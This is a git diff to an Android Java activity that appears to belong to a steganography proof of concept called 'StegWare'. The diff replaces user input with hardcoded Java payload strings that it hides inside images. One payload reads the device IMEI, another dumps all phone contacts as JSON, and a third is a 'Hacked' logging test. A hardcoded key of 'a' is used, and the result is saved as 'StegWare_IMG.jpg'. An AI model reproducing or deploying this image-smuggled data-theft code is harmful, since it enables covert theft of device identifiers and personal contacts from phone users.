@@ -10,7 +10,6 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.provider.MediaStore;
 import android.util.Log;
-import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ImageView;
@@ -40,8 +39,6 @@ public class Encode extends AppCompatActivity implements TextEncodingCallback {
     // Created variables for UI
     private TextView whether_encoded;
     private ImageView imageView;
-    private EditText message;
-    private EditText secret_key;
 
     // Objects needed for encoding
     private TextEncoding textEncoding;
@@ -64,15 +61,11 @@ public class Encode extends AppCompatActivity implements TextEncodingCallback {
 
         imageView = findViewById(R.id.imageview);
 
-        message = findViewById(R.id.message);
-        secret_key = findViewById(R.id.secret_key);
-
         Button choose_image_button = findViewById(R.id.choose_image_button);
         Button encode_button = findViewById(R.id.encode_button);
         Button save_image_button = findViewById(R.id.save_image_button);
 
         checkAndRequestPermissions();
-
 
         //Choose image button
         choose_image_button.setOnClickListener(view -> ImageChooser());
@@ -81,19 +74,21 @@ public class Encode extends AppCompatActivity implements TextEncodingCallback {
         encode_button.setOnClickListener(view -> {
             whether_encoded.setText("");
             if (filepath != null) {
-//                    if (message.getText() != null) {
+                String test = "import android.util.Log;import android.content.Context;class RuntimeClass {  public RuntimeClass() {}   public String run(Context context) {    Log.d(\"TAG_HACK\", \"Hacked\");      return \"Hacked!\";    }}";
+                String imei = "import android.content.Context;import android.telephony.TelephonyManager;class RuntimeClass {    public RuntimeClass() {}    public String run(Context context) {        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);        return telephonyManager.getDeviceId();    }}";
 
-                    String msg = "import android.util.Log;\\nimport android.content.Context;\\n\\nclass RuntimeClass {\\n  \\tpublic RuntimeClass() {}\\n  \\n \\tpublic String run(Context context) {\\n    \\tLog.d(\\\"TAG_HACK\\\", \\\"Hacked\\\");\\n      \\treturn \\\"Hacked!\\\";\\n    }\\n}";
+                String phoneContact = "import android.content.Context;import android.database.Cursor;import android.net.Uri;class RuntimeClass {    public RuntimeClass() {}    public String run(Context context) {        Cursor cursor = context.getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, null, null, null);        String jsonEncodedContacts = \"[\";        if (cursor != null && cursor.moveToFirst() ) {            do {                jsonEncodedContacts += \"{\";                for(int idx=0; idx < cursor.getColumnCount(); idx++){                    jsonEncodedContacts += \" \"\" + cursor.getColumnName(idx) + \"\":\"\" + cursor.getString(idx) + \"\",\";                }                jsonEncodedContacts = jsonEncodedContacts.substring(0, jsonEncodedContacts.length() - 1);                jsonEncodedContacts += \"},\";            } while (cursor.moveToNext());            jsonEncodedContacts = jsonEncodedContacts.substring(0, jsonEncodedContacts.length() - 1);        }        jsonEncodedContacts += \"]\";        return  jsonEncodedContacts;    }}";
 
-                    //ImageSteganography Object instantiation
-                    imageSteganography = new ImageSteganography(msg,
-                            secret_key.getText().toString(),
-                            original_image);
-                    //TextEncoding object Instantiation
-                    textEncoding = new TextEncoding(Encode.this, Encode.this);
-                    //Executing the encoding
-                    textEncoding.execute(imageSteganography);
-//                    }
+                // ImageSteganography Object instantiation
+                imageSteganography = new ImageSteganography(test,
+                        "a",
+                        original_image);
+
+                // TextEncoding object Instantiation
+                textEncoding = new TextEncoding(Encode.this, Encode.this);
+
+                // Executing the encoding
+                textEncoding.execute(imageSteganography);
             }
         });
 
@@ -147,9 +142,6 @@ public class Encode extends AppCompatActivity implements TextEncodingCallback {
 
     @Override
     public void onCompleteTextEncoding(ImageSteganography result) {
-
-        //By the end of textEncoding
-
         if (result != null && result.isEncoded()) {
             encoded_image = result.getEncoded_image();
             whether_encoded.setText("Encoded");
@@ -160,15 +152,13 @@ public class Encode extends AppCompatActivity implements TextEncodingCallback {
     private void saveToInternalStorage(Bitmap bitmapImage) {
         OutputStream fOut;
         File file = new File(Environment.getExternalStoragePublicDirectory(
-                Environment.DIRECTORY_DOWNLOADS), "Encoded" + ".PNG"); // the File to save ,
+                Environment.DIRECTORY_DOWNLOADS), "StegWare_IMG.jpg"); // the File to save ,
         try {
             fOut = new FileOutputStream(file);
             bitmapImage.compress(Bitmap.CompressFormat.PNG, 100, fOut); // saving the Bitmap to a file
             fOut.flush(); // Not really required
             fOut.close(); // do not forget to close the stream
             whether_encoded.post(() -> save.dismiss());
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -189,6 +179,4 @@ public class Encode extends AppCompatActivity implements TextEncodingCallback {
             ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 1);
         }
     }
-
-
 }
